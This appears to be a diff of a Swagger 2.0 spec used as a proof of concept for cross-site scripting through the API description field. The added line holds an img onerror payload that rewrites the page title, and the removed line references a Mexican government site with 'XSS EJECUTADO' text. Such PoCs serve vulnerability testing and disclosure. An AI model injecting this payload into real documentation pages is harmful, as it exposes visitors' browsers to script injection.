@@ -1,6 +1,6 @@
 swagger: "2.0"
 info:
-  title: "Image Test PoC"
-  description: '<img src="https://certifica.buengobierno.gob.mx/html/images/BG_logo.png/?text=XSS+EJECUTADO" style="border:3px solid red;display:block;margin:10px;">'
+  title: "Title Test PoC"
+  description: '<img src=x onerror="document.title=`XSS-PWNED-${document.domain}`">'
   version: "1.0.0"
 paths: {}
